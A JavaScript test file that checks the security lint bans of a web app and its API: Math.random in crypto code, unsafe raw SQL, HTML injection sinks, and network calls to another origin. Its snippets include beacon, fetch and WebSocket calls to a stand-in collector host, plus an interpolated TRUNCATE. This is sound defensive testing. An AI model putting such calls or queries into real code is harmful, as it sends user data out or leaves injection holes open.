// Tests for the security bans in eslint.config.js (node:test with ESLint's own API): npm run test:lint.
// Each snippet is linted as if it lived at the given path, so the config's `files` and `ignores` globs decide which
// bans apply, exactly as in `npm run lint`. No fixture file is written to the repository.
import assert from 'node:assert/strict';
import path from 'node:path';
import { describe, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { ESLint } from 'eslint';

const repoRoot = path.dirname(fileURLToPath(import.meta.url));
const eslint = new ESLint({ cwd: repoRoot });

/** The rule ids of every problem ESLint reports for `code` at `filePath` (relative to the repository root). */
async function ruleIds(code, filePath) {
  const [result] = await eslint.lintText(code, { filePath: path.join(repoRoot, filePath) });
  assert.ok(result, `no lint result for ${filePath}`);
  const fatal = result.messages.filter((m) => m.fatal || m.ruleId === null);
  assert.deepEqual(fatal, [], `${filePath} must parse and must not be ignored`);
  return result.messages.map((m) => m.ruleId);
}

async function assertBanned(code, filePath, ruleId) {
  const ids = await ruleIds(code, filePath);
  assert.ok(
    ids.includes(ruleId),
    `${ruleId} must fire for ${JSON.stringify(code)} in ${filePath}; got [${ids}]`,
  );
}

async function assertAllowed(code, filePath, ruleId) {
  const ids = await ruleIds(code, filePath);
  assert.ok(
    !ids.includes(ruleId),
    `${ruleId} must not fire for ${JSON.stringify(code)} in ${filePath}`,
  );
}

const PROPS = 'no-restricted-properties';
const SYNTAX = 'no-restricted-syntax';

describe('Math.random in key-handling code', () => {
  const code = 'export const nonce = () => Math.random();\n';
  const destructured = 'const { random } = Math;\nexport const pick = () => random();\n';

  for (const file of [
    'packages/crypto/src/__lint__.ts',
    'apps/web/src/crypto/__lint__.ts',
    'apps/web/src/workers/__lint__.ts',
  ]) {
    test(`is an error in ${path.dirname(file)}`, async () => {
      await assertBanned(code, file, PROPS);
      await assertBanned(destructured, file, PROPS);
    });
  }

  test('stays allowed in tests and in code that handles no keys', async () => {
    await assertAllowed(code, 'packages/crypto/src/__lint__.test.ts', PROPS);
    await assertAllowed(code, 'apps/web/src/components/__lint__.tsx', PROPS);
    await assertAllowed(
      'export const n = () => crypto.getRandomValues(new Uint8Array(12));\n',
      'packages/crypto/src/__lint__.ts',
      PROPS,
    );
  });
});

describe('unsafe raw SQL in the API', () => {
  const file = 'apps/api/src/__lint__.ts';

  test('$queryRawUnsafe, $executeRawUnsafe and Prisma.raw are errors', async () => {
    await assertBanned(
      'export const f = (p: any, id: string) => p.$queryRawUnsafe(`SELECT ${id}`);\n',
      file,
      PROPS,
    );
    await assertBanned(
      'export const f = (p: any, t: string) => p.$executeRawUnsafe(`TRUNCATE ${t}`);\n',
      file,
      PROPS,
    );
    await assertBanned(
      "import { Prisma } from '@prisma/client';\nexport const frag = (s: string) => Prisma.raw(s);\n",
      file,
      PROPS,
    );
  });

  test('the parameterised tagged templates stay allowed, and so do test helpers', async () => {
    await assertAllowed(
      'export const f = (p: any, id: string) => p.$queryRaw`SELECT * FROM "Drop" WHERE id = ${id}`;\n',
      file,
      PROPS,
    );
    await assertAllowed(
      'export const f = (p: any) => p.$executeRawUnsafe(\'ANALYZE "Drop"\');\n',
      'apps/api/src/__lint__.test.ts',
      PROPS,
    );
  });
});

describe('HTML from strings in the SPA', () => {
  test('innerHTML, outerHTML, insertAdjacentHTML and document.write are errors', async () => {
    for (const code of [
      'export const f = (el: HTMLElement, s: string) => { el.innerHTML = s; };\n',
      'export const f = (el: HTMLElement) => el.outerHTML;\n',
      "export const f = (el: HTMLElement, s: string) => el.insertAdjacentHTML('beforeend', s);\n",
      'export const f = (s: string) => document.write(s);\n',
    ]) {
      await assertBanned(code, 'apps/web/src/components/__lint__.tsx', PROPS);
    }
  });

  test('the bans also hold in the crypto and worker folders, which add Math.random to them', async () => {
    const code = 'export const f = (el: HTMLElement, s: string) => { el.innerHTML = s; };\n';
    await assertBanned(code, 'apps/web/src/crypto/__lint__.ts', PROPS);
    await assertBanned(code, 'apps/web/src/workers/__lint__.ts', PROPS);
  });

  test('dangerouslySetInnerHTML is an error, in JSX and as a props object', async () => {
    await assertBanned(
      'export const C = ({ html }: { html: string }) => <div dangerouslySetInnerHTML={{ __html: html }} />;\n',
      'apps/web/src/components/__lint__.tsx',
      SYNTAX,
    );
    await assertBanned(
      "import { createElement } from 'react';\nexport const c = (h: string) => createElement('div', { dangerouslySetInnerHTML: { __html: h } });\n",
      'apps/web/src/components/__lint__.tsx',
      SYNTAX,
    );
  });

  test('text content and tests stay allowed', async () => {
    await assertAllowed(
      'export const f = (el: HTMLElement, s: string) => { el.textContent = s; };\n',
      'apps/web/src/components/__lint__.tsx',
      PROPS,
    );
    await assertAllowed(
      'export const C = ({ s }: { s: string }) => <p>{s}</p>;\n',
      'apps/web/src/components/__lint__.tsx',
      SYNTAX,
    );
    await assertAllowed(
      'export const f = (el: HTMLElement) => el.innerHTML;\n',
      'apps/web/src/components/__lint__.test.tsx',
      PROPS,
    );
  });
});

describe('requests to another origin from the SPA', () => {
  const file = 'apps/web/src/lib/__lint__.ts';

  test('a literal absolute or protocol-relative URL is an error in every network call', async () => {
    for (const code of [
      "export const f = () => fetch('https://collector.example/x');\n",
      "export const f = () => fetch('HTTP://collector.example/x');\n",
      "export const f = () => fetch('//collector.example/x');\n",
      'export const f = (host: string) => fetch(`https://${host}/x`);\n',
      "export const f = () => window.fetch('https://collector.example/x');\n",
      "export const f = () => self.fetch('https://collector.example/x');\n",
      "export const f = () => globalThis.fetch('https://collector.example/x');\n",
      "export const f = () => new Request('https://collector.example/x');\n",
      "export const f = () => new EventSource('https://collector.example/stream');\n",
      "export const f = () => new WebSocket('wss://collector.example/ws');\n",
      "export const f = (b: Blob) => navigator.sendBeacon('https://collector.example/b', b);\n",
    ]) {
      await assertBanned(code, file, SYNTAX);
    }
    // The workers are part of the SPA too.
    await assertBanned(
      "export const f = () => fetch('https://collector.example/x');\n",
      'apps/web/src/workers/__lint__.ts',
      SYNTAX,
    );
  });

  test('same-origin paths and computed URLs stay allowed', async () => {
    for (const code of [
      "export const f = () => fetch('/api/auth/refresh');\n",
      'export const f = (id: string) => fetch(`/api/drops/${id}`);\n',
      'export const f = (url: string) => fetch(url);\n',
      "export const f = (apiUrl: (p: string) => string) => fetch(apiUrl('/me'));\n",
    ]) {
      await assertAllowed(code, file, SYNTAX);
    }
  });
});
